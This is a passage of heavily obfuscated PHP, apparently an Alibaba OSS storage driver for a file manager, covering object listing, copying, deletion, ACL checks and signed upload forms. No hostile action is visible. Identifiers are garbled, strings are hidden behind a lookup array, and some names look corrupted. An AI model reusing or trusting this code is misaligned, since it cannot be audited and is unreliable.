$d£Â¹‰ºè™ = 0) { goto BÑ‰¸‹ˆÂ×; BÚáìŞö“¾: return array($cÒ§‰ÅÑ±[74] => $föÍŠÈÒ, $cÒ§‰ÅÑ±[73] => $eø†¼ì„‘‡); goto dÓªÑÛ‹ì¾; CĞ¼ìÇŞÖ–: $föÍŠÈÒ = $eø†¼ì„‘‡ = array(); while (!0) { check_abort(); $C¶§î‹„®‘ = array($cÒ§‰ÅÑ±[1246] => $Bï˜† »¢§, $cÒ§‰ÅÑ±[1247] => $CĞ¢¨ˆÓÛ‰, $cÒ§‰ÅÑ±[1248] => $cÆ°ôù„Ğ, $cÒ§‰ÅÑ±[1249] => $FÅ¯²ä¯ïˆ); try { $fŠƒ–¤¸´­ = $this->client->listObjects($this->bucket, $C¶§î‹„®‘); } catch (OSS\Core\OssException $Eä¬ÂËÙòŒ) { break; } $FÅ¯²ä¯ïˆ = $fŠƒ–¤¸´­->getNextMarker(); $CÉŸÌõÚÓÓ = $fŠƒ–¤¸´­->getObjectList(); $BœŠ³Ò’ŒÍ = $fŠƒ–¤¸´­->getPrefixList(); foreach ($CÉŸÌõÚÓÓ as $dò†Ù¼˜£„) { goto aÀĞÎÏ‡Ûù; aÀĞÎÏ‡Ûù: if ($dò†Ù¼˜£„->getKey() == $CĞ¢¨ˆÓÛ‰) { continue; } $d— ›éïˆ = $dò†Ù¼˜£„->getKey(); $F†à…½Øİ = $dò†Ù¼˜£„->getSize(); goto Cºİ¼¶ÛÆ£; Cºİ¼¶ÛÆ£: $Bİà ™…”Á = $dò†Ù¼˜£„->getLastModified(); $D¯Õ’Çà«‘ = $d£Â¹‰ºè™ ? array($cÒ§‰ÅÑ±[28] => $d— ›éïˆ, $cÒ§‰ÅÑ±[77] => $F†à…½Øİ, $cÒ§‰ÅÑ±[195] => strtotime($Bİà ™…”Á)) : $d— ›éïˆ; $aÜ¢¿ÈçŸ = $F†à…½Øİ == 0 && substr($d— ›éïˆ, strlen($d— ›éïˆ) - 1, 1) == $cÒ§‰ÅÑ±[8] ? !0 : !1; goto C¶¶ ëÍº; C¶¶ ëÍº: if ($B‘ºŸšåº) { $this->cacheMethod($cÒ§‰ÅÑ±[197], $d— ›éïˆ, $aÜ¢¿ÈçŸ); $this->cacheMethod($cÒ§‰ÅÑ±[198], $d— ›éïˆ, array($cÒ§‰ÅÑ±[77] => $F†à…½Øİ, $cÒ§‰ÅÑ±[1250] => $F†à…½Øİ, $cÒ§‰ÅÑ±[83] => strtotime($Bİà ™…”Á), $cÒ§‰ÅÑ±[1251] => $Bİà ™…”Á)); } if ($aÜ¢¿ÈçŸ) { $föÍŠÈÒ[] = $d— ›éïˆ; continue; } $eø†¼ì„‘‡[] = $D¯Õ’Çà«‘; goto A©ÇÓÓÖ; A©ÇÓÓÖ: } foreach ($BœŠ³Ò’ŒÍ as $cãˆµŒÓËè) { $föÍŠÈÒ[] = $cãˆµŒÓËè->getPrefix(); if ($B‘ºŸšåº) { $this->cacheMethod($cÒ§‰ÅÑ±[197], $d— ›éïˆ, !0); } } if ($FÅ¯²ä¯ïˆ === $cÒ§‰ÅÑ±[33]) { break; } } if ($B‘ºŸšåº) { $this->cacheMethod($cÒ§‰ÅÑ±[197], $a‘»©ËÍ“, !0); } goto BÚáìŞö“¾; BÑ‰¸‹ˆÂ×: $cÒ§‰ÅÑ± =& $_SERVER[Æ¼ôºÙï]; $a‘»©ËÍ“ = trim($a‘»©ËÍ“, $cÒ§‰ÅÑ±[8]); $CĞ¢¨ˆÓÛ‰ = empty($a‘»©ËÍ“) ? $cÒ§‰ÅÑ±[33] : $a‘»©ËÍ“ . $cÒ§‰ÅÑ±[8]; goto A£ÙæƒĞ˜; A£ÙæƒĞ˜: $FÅ¯²ä¯ïˆ = $cÒ§‰ÅÑ±[33]; $cÆ°ôù„Ğ = 1000; $B‘ºŸšåº = $this->listItemCache === !1 ? !1 : !0; goto CĞ¼ìÇŞÖ–; dÓªÑÛ‹ì¾: } public function copyFile($AÍÁÎÜ„çÉ, $B«£¸¡ƒÕ†) { $B°Œ‡ïˆ™› = $this->size($AÍÁÎÜ„çÉ); if ($B°Œ‡ïˆ™› < 1024 * 1024 * 1024) { try { $this->client->copyObject($this->bucket, $AÍÁÎÜ„çÉ, $this->bucket, $this->pathEncode($B«£¸¡ƒÕ†)); } catch (OSS\Core\OssException $Eİê¦‰ÆÔ) { return !1; } return $this->getPathOuter($B«£¸¡ƒÕ†); } $fó†¥Òì = $this->multiCopyObject($AÍÁÎÜ„çÉ, $B«£¸¡ƒÕ†, $B°Œ‡ïˆ™›); return $fó†¥Òì ? $this->getPathOuter($B«£¸¡ƒÕ†) : !1; } private function multiCopyObject($AÃ’¡¼Ø¦æ, $eæÇèöòÄÍ, $FØã¤¤ğ¯Ë) { $eÓ™£í½‚ç =& $_SERVER[Æ¼ôºÙï]; try { goto cÖÏ‚ùç‰¸; cÖÏ‚ùç‰¸: $fšŒ÷ß‰• = array(); if ($d…¸»®¶’ = $this->hashMd5($AÃ’¡¼Ø¦æ)) { $fšŒ÷ß‰• = array(OSS\OssClient::OSS_HEADERS => array($eÓ™£í½‚ç[1252] => $d…¸»®¶’)); } $f·ÄÒ•¥¥È = $this->client->initiateMultipartUpload($this->bucket, $this->pathEncode($eæÇèöòÄÍ), $fšŒ÷ß‰•); goto FßÑØË´º¹; eŒÈ‹¢áŞ: $C·°„ßœÙ” = 1024 * 1024 * 10; $Fˆˆ…ØĞ· = $this->client->generateMultiuploadParts($FØã¤¤ğ¯Ë, $C·°„ßœÙ”); foreach ($Fˆˆ…ØĞ· as $Eçƒ„¯¨¶Ë => $cà†Å†¸æÜ) { $F‡ê—ç¢«Œ = $CñÍ¦É×©÷ + (int) $cà†Å†¸æÜ[$eÓ™£í½‚ç[1253]]; $a³ÕÓ¾¸ª± = (int) $cà†Å†¸æÜ[$eÓ™£í½‚ç[333]] + $F‡ê—ç¢«Œ - 1; $eíèò–‚òª = array($eÓ™£í½‚ç[1254] => $F‡ê—ç¢«Œ, $eÓ™£í½‚ç[1255] => $a³ÕÓ¾¸ª±); $aé´…ÁîØ‘[] = $this->client->uploadPartCopy($this->bucket, $AÃ’¡¼Ø¦æ, $this->bucket, $this->pathEncode($eæÇèöòÄÍ), $AêÍ—è“¨­, $f·ÄÒ•¥¥È, $eíèò–‚òª); $AêÍ—è“¨­ = $AêÍ—è“¨­ + 1; } goto AÍÊäë‹Ì«; AÍÊäë‹Ì«: $C¼»š³‡Ïì = array(); foreach ($aé´…ÁîØ‘ as $Eçƒ„¯¨¶Ë => $CƒÒäÒº¦¥) { $C¼»š³‡Ïì[] = array($eÓ™£í½‚ç[1256] => $Eçƒ„¯¨¶Ë + 1, $eÓ™£í½‚ç[1257] => $CƒÒäÒº¦¥); } $this->client->completeMultipartUpload($this->bucket, $this->pathEncode($eæÇèöòÄÍ), $f·ÄÒ•¥¥È, $C¼»š³‡Ïì); goto BÓö‹÷«Ï¦; FßÑØË´º¹: $AêÍ—è“¨­ = 1; $CñÍ¦É×©÷ = 0; $aé´…ÁîØ‘ = array(); goto eŒÈ‹¢áŞ; BÓö‹÷«Ï¦: } catch (OSS\Core\OssException $d¸­šò¹´Ï) { return !1; } return !0; } public function moveFile($dß²Ø­ä·, $A†ç†“‘Í“) { if ($this->copyFile($dß²Ø­ä·, $A†ç†“‘Í“)) { $this->remove($dß²Ø­ä·); return $this->getPathOuter($A†ç†“‘Í“); } return !1; } public function delFile($Eƒ„ª¡—”‡) { try { $this->client->deleteObject($this->bucket, $this->pathEncode($Eƒ„ª¡—”‡)); } catch (OSS\Core\OssException $fŠÔïõÎÙÓ) { return !1; } return !0; } public function delFolder($C­ÆÄç¢ë) { goto f”¥ÃÒÚ¬; c½„»‹ø½: return $this->delByBatch($Eñ¶ëè¶Ìõ[$E‡äœÁˆ£ª[74]]); goto fÅŞ®ÕË¡İ; f”¥ÃÒÚ¬: $E‡äœÁˆ£ª =& $_SERVER[Æ¼ôºÙï]; if (!$this->exist($C­ÆÄç¢ë)) { return !0; } $this->listItemCache = !1; goto C„äÚçÇÈ; C„äÚçÇÈ: $Eñ¶ëè¶Ìõ = $this->fileList($C­ÆÄç¢ë); $this->listItemCache = !0; $F¡İ÷ß·ñì = trim($C­ÆÄç¢ë, $E‡äœÁˆ£ª[8]) . $E‡äœÁˆ£ª[8]; goto a«†ªÇê§Œ; a«†ªÇê§Œ: if (!empty($C­ÆÄç¢ë) && !in_array($F¡İ÷ß·ñì, $Eñ¶ëè¶Ìõ[$E‡äœÁˆ£ª[74]])) { $Eñ¶ëè¶Ìõ[$E‡äœÁˆ£ª[74]][] = $F¡İ÷ß·ñì; } $bƒÖª…£¾ê = $this->delByBatch($Eñ¶ëè¶Ìõ[$E‡äœÁˆ£ª[73]]); if (!$bƒÖª…£¾ê) { return !1; } goto c½„»‹ø½; fÅŞ®ÕË¡İ: } private function delByBatch($cµÕœÂä) { foreach (array_chunk($cµÕœÂä, 1000) as $FïÅ‡¹›áŞ) { try { $this->client->deleteObjects($this->bucket, $FïÅ‡¹›áŞ); } catch (OSS\Core\OssException $F ôµŒ³¾) { return !1; } } return !0; } public function rename($eç´‘è¯Ü, $bè¹“ÍÎ’) { return $this->renameObject($eç´‘è¯Ü, $bè¹“ÍÎ’); } private function fileInfo($dï¥Ù˜ÏÈà, $a—¯ìÊ•œ† = false, $b¨µ‹¶‚¢ˆ = array()) { goto C»¯ˆÒ‘Ë’; EÎ›ŞÙØÍ§: if (isset($b¨µ‹¶‚¢ˆ[$d„ïò™„°ñ[77]])) { $Fá×¸ã‘î“[$d„ïò™„°ñ[77]] = $b¨µ‹¶‚¢ˆ[$d„ïò™„°ñ[77]]; } if (isset($b¨µ‹¶‚¢ˆ[$d„ïò™„°ñ[83]])) { $Fá×¸ã‘î“[$d„ïò™„°ñ[83]] = $b¨µ‹¶‚¢ˆ[$d„ïò™„°ñ[83]]; } if (isset($b¨µ‹¶‚¢ˆ[$d„ïò™„°ñ[195]]) && !trim($Fá×¸ã‘î“[$d„ïò™„°ñ[83]])) { $Fá×¸ã‘î“[$d„ïò™„°ñ[83]] = $b¨µ‹¶‚¢ˆ[$d„ïò™„°ñ[195]]; } goto Cùñ®æÓÄµ; Cùñ®æÓÄµ: return $Fá×¸ã‘î“; goto Fõ¼­½ ãâ; C»¯ˆÒ‘Ë’: $d„ïò™„°ñ =& $_SERVER[Æ¼ôºÙï]; $Fá×¸ã‘î“ = array($d„ïò™„°ñ[28] => $this->pathThis($dï¥Ù˜ÏÈà), $d„ïò™„°ñ[75] => $this->getPathOuter($dï¥Ù˜ÏÈà), $d„ïò™„°ñ[29] => $d„ïò™„°ñ[173], $d„ïò™„°ñ[77] => isset($b¨µ‹¶‚¢ˆ[$d„ïò™„°ñ[77]]) ? $b¨µ‹¶‚¢ˆ[$d„ïò™„°ñ[77]] : 0, $d„ïò™„°ñ[167] => $this->ext($dï¥Ù˜ÏÈà)); if ($a—¯ìÊ•œ†) { return $Fá×¸ã‘î“; } goto bÅ×²İóÖ®; bÅ×²İóÖ®: $Fá×¸ã‘î“[$d„ïò™„°ñ[192]] = $Fá×¸ã‘î“[$d„ïò™„°ñ[83]] = 0; $Fá×¸ã‘î“[$d„ïò™„°ñ[193]] = $Fá×¸ã‘î“[$d„ïò™„°ñ[194]] = !0; if (empty($b¨µ‹¶‚¢ˆ)) { $EùÉ‚ñŠæ = $this->objectMeta($dï¥Ù˜ÏÈà); if (!$EùÉ‚ñŠæ) { return $Fá×¸ã‘î“; } $b¨µ‹¶‚¢ˆ = array($d„ïò™„°ñ[83] => strtotime($EùÉ‚ñŠæ[$d„ïò™„°ñ[1251]]), $d„ïò™„°ñ[77] => $EùÉ‚ñŠæ[$d„ïò™„°ñ[1250]] + 0); } goto EÎ›ŞÙØÍ§; Fõ¼­½ ãâ: } private function folderInfo($Bñ¸Ó‰¡¦, $b‹‚¹Ÿ¦à = false, $cñ´ò¬×æ = array()) { goto AµˆãÖÙ—; cíÂÊ–ˆ¤œ: if (isset($cñ´ò¬×æ[$DŒËÂäÕ‰ª[83]])) { $dˆ»Ö‚[$DŒËÂäÕ‰ª[83]] = $cñ´ò¬×æ[$DŒËÂäÕ‰ª[83]]; } if (isset($cñ´ò¬×æ[$DŒËÂäÕ‰ª[192]])) { $dˆ»Ö‚[$DŒËÂäÕ‰ª[192]] = $cñ´ò¬×æ[$DŒËÂäÕ‰ª[192]]; } return $dˆ»Ö‚; goto A©Å±œ½ô³; bÅŠ ½ğì: $dˆ»Ö‚[$DŒËÂäÕ‰ª[192]] = $dˆ»Ö‚[$DŒËÂäÕ‰ª[83]] = 0; $dˆ»Ö‚[$DŒËÂäÕ‰ª[193]] = $dˆ»Ö‚[$DŒËÂäÕ‰ª[194]] = !0; if (empty($cñ´ò¬×æ)) { $Bñ¸Ó‰¡¦ = rtrim($Bñ¸Ó‰¡¦, $DŒËÂäÕ‰ª[8]) . $DŒËÂäÕ‰ª[8]; $c†ò½µáË = $this->objectMeta($Bñ¸Ó‰¡¦); if (!$c†ò½µáË) { return $dˆ»Ö‚; } $cñ´ò¬×æ = array($DŒËÂäÕ‰ª[192] => $c†ò½µáË[$DŒËÂäÕ‰ª[1258]][$DŒËÂäÕ‰ª[1259]], $DŒËÂäÕ‰ª[83] => strtotime($c†ò½µáË[$DŒËÂäÕ‰ª[1251]])); } goto cíÂÊ–ˆ¤œ; AµˆãÖÙ—: $DŒËÂäÕ‰ª =& $_SERVER[Æ¼ôºÙï]; $dˆ»Ö‚ = array($DŒËÂäÕ‰ª[28] => $this->pathThis($Bñ¸Ó‰¡¦), $DŒËÂäÕ‰ª[75] => $this->getPathOuter($DŒËÂäÕ‰ª[8] . $Bñ¸Ó‰¡¦), $DŒËÂäÕ‰ª[29] => $DŒËÂäÕ‰ª[76]); if ($b‹‚¹Ÿ¦à) { return $dˆ»Ö‚; } goto bÅŠ ½ğì; A©Å±œ½ô³: } public function listPath($cß×í‰ÙÂÒ, $aœÎ°İƒÏ = false) { $a‹ÔŠ¥†ÈÙ =& $_SERVER[Æ¼ôºÙï]; $C¹©˜›“…„ = $this->fileList($cß×í‰ÙÂÒ, $a‹ÔŠ¥†ÈÙ[8], !0); foreach ($C¹©˜›“…„[$a‹ÔŠ¥†ÈÙ[74]] as $aëçŒòŸã˜ => $AÎ‘Ò¼­‰ˆ) { $C¹©˜›“…„[$a‹ÔŠ¥†ÈÙ[74]][$aëçŒòŸã˜] = $this->folderInfo($AÎ‘Ò¼­‰ˆ, $aœÎ°İƒÏ, $AÎ‘Ò¼­‰ˆ); } foreach ($C¹©˜›“…„[$a‹ÔŠ¥†ÈÙ[73]] as $aëçŒòŸã˜ => $AÎ‘Ò¼­‰ˆ) { $C¹©˜›“…„[$a‹ÔŠ¥†ÈÙ[73]][$aëçŒòŸã˜] = $this->fileInfo($AÎ‘Ò¼­‰ˆ[$a‹ÔŠ¥†ÈÙ[28]], $aœÎ°İƒÏ, $AÎ‘Ò¼­‰ˆ); } return $C¹©˜›“…„; } public function has($aŒèƒÆÌãƒ, $C¦’ñÇÕ¼¨ = false, $bÍ‹İ¥ßèÑ = true) { goto AçÕ¤œï‰; CÂ’÷¹óó´: $dÃØï³Ù = $E­Ñ¸™¨[33]; $F¥®‘£Œ = 500; $bÑ÷èòó‚ = $DØ‡ùÈÓ­â = 0; goto fô¡˜ùéÍÕ; AçÕ¤œï‰: $E­Ñ¸™¨ =& $_SERVER[Æ¼ôºÙï]; $aŒèƒÆÌãƒ = trim($aŒèƒÆÌãƒ, $E­Ñ¸™¨[8]); $cŸçÆê®²‰ = empty($aŒèƒÆÌãƒ) ? $E­Ñ¸™¨[33] : $aŒèƒÆÌãƒ . $E­Ñ¸™¨[8]; goto CÂ’÷¹óó´; fô¡˜ùéÍÕ: while (!0) { check_abort(); $D¹©Ç·ÖÜ = array($E­Ñ¸™¨[1246] => $E­Ñ¸™¨[8], $E­Ñ¸™¨[1247] => $cŸçÆê®²‰, $E­Ñ¸™¨[1248] => $F¥®‘£Œ, $E­Ñ¸™¨[1249] => $dÃØï³Ù); try { $e«âñœ“¶ = $this->client->listObjects($this->bucket, $D¹©Ç·ÖÜ); } catch (OSS\Core\OssException $b¯Ñ•Š®¤Ó) { break; } $dÃØï³Ù = $e«âñœ“¶->getNextMarker(); $b³‰·Ì¥„ = $e«âñœ“¶->getObjectList(); $aöï°¹Éì = $e«âñœ“¶->getPrefixList(); if ($C¦’ñÇÕ¼¨) { if (count($b³‰·Ì¥„) > 1 || count($b³‰·Ì¥„) == 1 && $b³‰·Ì¥„[0]->getKey() != $cŸçÆê®²‰) { $bÑ÷èòó‚ += count($b³‰·Ì¥„) - 1; } if (!empty($aöï°¹Éì)) { $DØ‡ùÈÓ­â += count($aöï°¹Éì); } if ($dÃØï³Ù === $E­Ñ¸™¨[33]) { break; } continue; } if ($bÍ‹İ¥ßèÑ) { if (!empty($b³‰·Ì¥„)) { if (count($b³‰·Ì¥„) > 1 || $b³‰·Ì¥„[0]->getKey() != $cŸçÆê®²‰) { return !0; } } } else { if (!empty($aöï°¹Éì)) { return !0; } } if ($dÃØï³Ù === $E­Ñ¸™¨[33]) { break; } } if ($C¦’ñÇÕ¼¨) { return array($E­Ñ¸™¨[201] => $bÑ÷èòó‚, $E­Ñ¸™¨[202] => $DØ‡ùÈÓ­â); } return !1; goto eÙ‡ù„Ò‡’; eÙ‡ù„Ò‡’: } public function listAll($bÏÃ«Ş¿) { $DµÈ¿ÖöÑ² =& $_SERVER[Æ¼ôºÙï]; $A±ÃÚ‡¢£¨ = $this->fileList($bÏÃ«Ş¿, $DµÈ¿ÖöÑ²[33], !0); $Eò¦Â›ÚÊ = array(); foreach ($A±ÃÚ‡¢£¨[$DµÈ¿ÖöÑ²[73]] as $eîÕ›­§â) { $Eò¦Â›ÚÊ[$eîÕ›­§â[$DµÈ¿ÖöÑ²[28]]] = $eîÕ›­§â[$DµÈ¿ÖöÑ²[77]]; } foreach ($A±ÃÚ‡¢£¨[$DµÈ¿ÖöÑ²[74]] as $eîÕ›­§â) { if (is_string($eîÕ›­§â)) { $Eò¦Â›ÚÊ[$eîÕ›­§â] = 0; } } return $this->listAllFiles($bÏÃ«Ş¿, array_keys($Eò¦Â›ÚÊ), $Eò¦Â›ÚÊ); } public function canRead($D¬´Îœºè) { $Eæ¼Ç÷ Å× =& $_SERVER[Æ¼ôºÙï]; $FŠÙÚ¼—– = $this->pathAcl($D¬´Îœºè); return $FŠÙÚ¼—– == $Eæ¼Ç÷ Å×[1260] || $FŠÙÚ¼—– == $Eæ¼Ç÷ Å×[508] ? !0 : !1; } public function canWrite($a„â‰¢‘×º) { $e§¼ÀÌ» = $this->pathAcl($a„â‰¢‘×º); return $e§¼ÀÌ» == $_SERVER[Æ¼ôºÙï][508] ? !0 : !1; } public function pathAcl($EëÍØøÀ§‘) { goto cÇÚŒÇ†ŒÕ; fÎæ°Á˜À’: return $cö¦¢Âé¶; goto DÚÈ³Ì©â; A‡²á¢«Í: $cö¦¢Âé¶ = $F‚å²¯éŠ´ == $fºì™á¦‚¡[34] ? $this->bucketAcl : $F‚å²¯éŠ´; if ($cö¦¢Âé¶ == $fºì™á¦‚¡[1261]) { return $fºì™á¦‚¡[1260]; } if ($cö¦¢Âé¶ == $fºì™á¦‚¡[1262]) { return $fºì™á¦‚¡[508]; } goto fÎæ°Á˜À’; cÇÚŒÇ†ŒÕ: $fºì™á¦‚¡ =& $_SERVER[Æ¼ôºÙï]; if (empty($this->bucketAcl)) { $this->bucketAcl = $this->client->getBucketAcl($this->bucket); } try { $F‚å²¯éŠ´ = $this->client->getObjectAcl($this->bucket, $this->pathEncode($EëÍØøÀ§‘)); } catch (OSS\Core\OssException $E‹„›¤ÏÌ) { return !1; } goto A‡²á¢«Í; DÚÈ³Ì©â: } private function chmodPath($B åóº‰÷‚, $b¡ø´šÕ‘Ô = '') { $b–æ²ñ¾Éš =& $_SERVER[Æ¼ôºÙï]; $D‘Œäñ‘·Ï = empty($b¡ø´šÕ‘Ô) ? $b–æ²ñ¾Éš[1262] : $b¡ø´šÕ‘Ô; $c–±‰‹Š¬ê = array($b–æ²ñ¾Éš[34], $b–æ²ñ¾Éš[191], $b–æ²ñ¾Éš[1261], $b–æ²ñ¾Éš[1262]); if (!in_array($D‘Œäñ‘·Ï, $c–±‰‹Š¬ê)) { return !1; } try { $this->client->putObjectAcl($this->bucket, $this->pathEncode($B åóº‰÷‚), $D‘Œäñ‘·Ï); } catch (OSS\Core\OssException $fÏ¿­¼ÅÅ„) { return !1; } return !0; } public function getContent($fË¶­³øß) { return $this->fileSubstr($fË¶­³øß, -1); } public function setContent($C‰Ïƒ›‹½Ï, $D†øºĞ­¶ = '') { $BÃ»‚é­ÁÆ =& $_SERVER[Æ¼ôºÙï]; try { $c¤Õ·¡™õµ = $this->trafficLimit($BÃ»‚é­ÁÆ[1263]); $b–ôÄÇˆ® = $this->client->putObject($this->bucket, $this->pathEncode($C‰Ïƒ›‹½Ï), $D†øºĞ­¶, $c¤Õ·¡™õµ); } catch (OSS\Core\OssException $bŒÂÑâõøµ) { return !1; } $A÷ó³øéÒ = array($BÃ»‚é­ÁÆ[1252] => trim($b–ôÄÇˆ®[$BÃ»‚é­ÁÆ[1264]], $BÃ»‚é­ÁÆ[115]), OSS\OssClient::OSS_CONTENT_TYPE => get_file_mime(get_path_ext($C‰Ïƒ›‹½Ï))); $this->updateObjMeta($C‰Ïƒ›‹½Ï, $A÷ó³øéÒ); return isset($b–ôÄÇˆ®[$BÃ»‚é­ÁÆ[1265]][$BÃ»‚é­ÁÆ[1211]]) ? !0 : !1; } private function updateObjMeta($Fº¬»°ÌÕº, $fØĞ¯ ä÷ã) { $Fº¬»°ÌÕº = $this->pathEncode($Fº¬»°ÌÕº); try { $EÕÚöµ‘˜£ = array(OSS\OssClient::OSS_HEADERS => $fØĞ¯ ä÷ã); $this->client->copyObject($this->bucket, $Fº¬»°ÌÕº, $this->bucket, $Fº¬»°ÌÕº, $EÕÚöµ‘˜£); } catch (OSS\Core\OssException $C¥œ¿²Ù‰¾) { return !1; } return !0; } public function upload($DÛÂß›˜‘“, $a¶‘Ë ¶¬, $a®»Ã¾î©ø = false, $bª¶÷šÓùÕ = REPEAT_REPLACE) { $c¤¯Àê»—» =& $_SERVER[Æ¼ôºÙï]; $fÑÊåÒ¯í = trim($DÛÂß›˜‘“, $c¤¯Àê»—»[8]); $D‚»ÔÁïÅ = array(OSS\OssClient::OSS_CHECK_MD5 => !0, OSS\OssClient::OSS_PART_SIZE => 1024 * 1024 * 10, OSS\OssClient::OSS_HEADERS => array($c¤¯Àê»—»[1252] => @md5_file($a¶‘Ë ¶¬)), OSS\OssClient::OSS_CONTENT_TYPE => get_file_mime(get_path_ext($DÛÂß›˜‘“))); $D‚»ÔÁïÅ = $this->trafficLimit($c¤¯Àê»—»[1263], $D‚»ÔÁïÅ); try { $this->client->multiuploadFile($this->bucket, $this->pathEncode($fÑÊåÒ¯í), $a¶‘Ë ¶¬, $D‚»ÔÁïÅ); } catch (OSS\Core\OssException $e¨­¸Õ¾„”) { return !1; } return $this->getPathOuter($DÛÂß›˜‘“); } public function getHost() { $F«¡¼°éòí =& $_SERVER[Æ¼ôºÙï]; $eƒÀí½Íàò = explode($F«¡¼°éòí[177], parent::getHost()); return $eƒÀí½Íàò[0] . $F«¡¼°éòí[177] . $this->bucket . $F«¡¼°éòí[94] . $eƒÀí½Íàò[1]; } public function uploadFormData($fù¨Œè‚ğ§, $Dá‰…Œõ‰ = 3600) { goto CÚÒÛµóôŸ; E¡ÃñÆßÏ¹: $FìÁÄÉëÊÀ = $this->pathFather($fù¨Œè‚ğ§); $FÍ¼‰ª¨òÁ = array($A­ñ¿ƒí®Ë[1167] => $AÑˆÛ, $A­ñ¿ƒí®Ë[1168] => array(array($A­ñ¿ƒí®Ë[1268], 0, $F¼»Ö’¥×ª), array($A­ñ¿ƒí®Ë[1171], $A­ñ¿ƒí®Ë[1172], $FìÁÄÉëÊÀ))); $e×î˜•„† = base64_encode(json_encode($FÍ¼‰ª¨òÁ)); goto dç–ùœ²¦Ì; aö¦»•ì°Â: return $aš‹Ö™²³; goto FÙ‹½Œ÷ê×; dç–ùœ²¦Ì: $bÃİÒŞÜ = base64_encode(hash_hmac($A­ñ¿ƒí®Ë[228], $e×î˜•„†, $this->secret, !0)); $aš‹Ö™²³ = array($A­ñ¿ƒí®Ë[1177] => $e×î˜•„†, $A­ñ¿ƒí®Ë[1269] => $this->accessKey, $A­ñ¿ƒí®Ë[1173] => $A­ñ¿ƒí®Ë[1165], $A­ñ¿ƒí®Ë[1270] => $bÃİÒŞÜ, $A­ñ¿ƒí®Ë[175] => $d¥ÕÕÔï‘Õ); $aš‹Ö™²³ = $this->trafficLimit($A­ñ¿ƒí®Ë[1263], $aš‹Ö™²³); goto aö¦»•ì°Â; E›¡îï†Šè: $C”¢Èå›†Æ = strpos($AÑˆÛ, $A­ñ¿ƒí®Ë[292]); $AÑˆÛ = substr($AÑˆÛ, 0, $C”¢Èå›†Æ) . $A­ñ¿ƒí®Ë[1267]; $F¼»Ö’¥×ª = 1048576000 * 5; goto E¡ÃñÆßÏ¹; e‡İ¾µ×ìî: $eŠ¡§¡÷è = date($A­ñ¿ƒí®Ë[1266], time() + $aˆïÒ†Ñ†Œ); $D´›Ã¯¬õš = new DateTime($eŠ¡§¡÷è); $AÑˆÛ = $D´›Ã¯¬õš->format(DateTime::ISO8601); goto E›¡îï†Šè; CÚÒÛµóôŸ: $A­ñ¿ƒí®Ë =& $_SERVER[Æ¼ôºÙï]; if (!($d¥ÕÕÔï‘Õ = $this->getHost())) { return !1; } $aˆïÒ†Ñ†Œ = $Dá‰…Œõ‰; goto e‡İ¾µ×ìî; FÙ‹½Œ÷ê×: } public function multiUploadFormData($A„ÔÃÓåö, $FĞ‹Ü¯âî = 3600) { $dŠ¶ŒÄ¬ºº =& $_SERVER[Æ¼ôºÙï]; if (!($báÖ¡éÓ¢â = $this->getHost())) { return !1; } $a¼ƒí”‡‘Ê = $this->trafficLimit($dŠ¶ŒÄ¬ºº[1263]); $dÜ‹á—íŸö = $this->client->initiateMultipartUpload($this->bucket, $this->pathEncode($A„ÔÃÓåö), $a¼ƒí”‡‘Ê); return array($dŠ¶ŒÄ¬ºº[219] => $dÜ‹á—íŸö, $dŠ¶ŒÄ¬ºº[175] => $báÖ¡éÓ¢â . $dŠ¶ŒÄ¬ºº[8] . $this->pathEncode($A„ÔÃÓåö), $dŠ¶ŒÄ¬ºº[220] => gmdate($dŠ¶ŒÄ¬ºº[1271]), $dŠ¶ŒÄ¬ºº[92] => $A„ÔÃÓåö); } public function multiUploadAuthData($eñÇ¹ÙÈé, $Få½áåÕ’ = array()) { goto FÏ‘Æª†’; a¦ƒöÂÃòÕ: if (!empty($Få½áåÕ’[$EŸ³ÄïÀ÷ˆ[1273]])) { $A¹ß™ğ = array_merge(array($D—ê—À³[4]), $Få½áåÕ’[$EŸ³ÄïÀ÷ˆ[1273]]); sort($A¹ß™ğ); $D—ê—À³[4] = implode($EŸ³ÄïÀ÷ˆ[227], $A¹ß™ğ); } $aˆ«¤¦ÁÀ = implode($EŸ³ÄïÀ÷ˆ[227], $D—ê—À³); $Aœ°ˆ¾ÂâĞ = base64_encode(hash_hmac($EŸ³ÄïÀ÷ˆ[228], $aˆ«¤¦ÁÀ, $this->secret, !0)); goto E…·Ü›Ù®; e¹ƒ…ùòİ: $D—ê—À³ = array($EŸ³ÄïÀ÷ˆ[222], $EŸ³ÄïÀ÷ˆ[33], $EŸ³ÄïÀ÷ˆ[118], $C®¿ë·ÍçÂ, "\170\55\x6f\x73\x73\55\144\141\164\145\x3a{$C®¿ë·ÍçÂ}", $EŸ³ÄïÀ÷ˆ[8] . $this->bucket . $EŸ³ÄïÀ÷ˆ[8] . $eõÏƒĞäµ . $C„ˆº½®Ç); if (strpos($C„ˆº½®Ç, $EŸ³ÄïÀ÷ˆ[223]) === 0) { $D—ê—À³[0] = $EŸ³ÄïÀ÷ˆ[224]; if ($c÷¤À§Ô¹ì = $this->trafficLimit($EŸ³ÄïÀ÷ˆ[1263])) { $eõÏƒĞäµ = $EŸ³ÄïÀ÷ˆ[1272]; array_splice($D—ê—À³, 5, 0, $eõÏƒĞäµ . $EŸ³ÄïÀ÷ˆ[4] . $c÷¤À§Ô¹ì[$eõÏƒĞäµ]); } } if (isset($Få½áåÕ’[$EŸ³ÄïÀ÷ˆ[225]]) && $Få½áåÕ’[$EŸ³ÄïÀ÷ˆ[225]] == $EŸ³ÄïÀ÷ˆ[226]) { $D—ê—À³[0] = $EŸ³ÄïÀ÷ˆ[226]; } goto a¦ƒöÂÃòÕ; E…·Ü›Ù®: $DêÃò¼­ñğ = $EŸ³ÄïÀ÷ˆ[1236] . $this->accessKey . $EŸ³ÄïÀ÷ˆ[4] . $Aœ°ˆ¾ÂâĞ; if (strpos($C„ˆº½®Ç, $EŸ³ÄïÀ÷ˆ[223]) === 0) { $DêÃò¼­ñğ = array($EŸ³ÄïÀ÷ˆ[230] => $DêÃò¼­ñğ, $EŸ³ÄïÀ÷ˆ[220] => $C®¿ë·ÍçÂ); if ($c÷¤À§Ô¹ì) { $DêÃò¼­ñğ = array_merge($DêÃò¼­ñğ, $c÷¤À§Ô¹ì); } } return $DêÃò¼­ñğ; goto dÉ°«òãÖ×; B³åö¼Å÷: $eõÏƒĞäµ = $eñÇ¹ÙÈé; if (isset($Få½áåÕ’[$EŸ³ÄïÀ÷ˆ[92]])) { $eõÏƒĞäµ = $Få½áåÕ’[$EŸ³ÄïÀ÷ˆ[92]]; unset($Få½áåÕ’[$EŸ³ÄïÀ÷ˆ[92]]); } if 